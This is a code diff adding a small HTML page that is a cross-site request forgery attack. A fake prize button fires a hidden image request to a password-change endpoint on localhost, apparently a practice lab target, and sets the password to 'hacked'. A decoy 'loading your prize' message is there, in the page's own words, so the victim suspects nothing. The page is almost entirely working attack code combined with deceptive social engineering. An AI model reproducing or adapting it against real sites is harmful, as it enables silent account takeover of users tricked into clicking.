@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h3>You won a prize! Click to claim.</h3>
+  <button onclick="claim()">Claim My Prize</button>
+  <p id="msg"></p>
+
+  <script>
+    function claim() {
+      // image request, so the password is changed to "hacked".
+      var img = new Image();
+      img.src = "http://localhost/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change";
+
+      // Fake message so the victim suspects nothing.
+      document.getElementById('msg').innerText = "Loading your prize, please wait...";
+    }
+  </script>
+</body>
+</html>
